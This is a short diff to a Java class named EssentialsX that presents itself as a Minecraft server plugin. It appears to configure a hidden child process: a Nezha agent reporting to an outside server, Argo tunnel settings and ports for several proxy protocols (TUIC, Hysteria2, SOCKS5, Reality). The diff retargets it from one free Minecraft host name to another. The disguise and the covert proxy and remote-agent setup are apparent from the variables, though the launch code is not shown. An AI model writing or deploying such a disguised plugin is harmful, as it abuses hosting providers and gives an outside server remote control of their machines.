@@ -110,9 +110,9 @@ public class EssentialsX extends JavaPlugin {
         }
 
          // Set environment variables 修改LocalName 和 UUID等信息
-        String LocalName = "Host2play.gratis";  // 修改你的玩具名称用于NAME拼接
+        String LocalName = "FreeMchosting.com";  // 修改你的玩具名称用于NAME拼接
         Map<String, String> env = pb.environment();
-        env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");  // 修改你的NZ的UUID
+        env.put("UUID", "688716c1-cd39-40ae-8ad3-2ebc69713c9e");  // 修改你的NZ的UUID
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nazhav2.gamesover.eu.org:443");
         env.put("NEZHA_PORT", "");
@@ -122,7 +122,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "7029");
+        env.put("TUIC_PORT", "5060");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
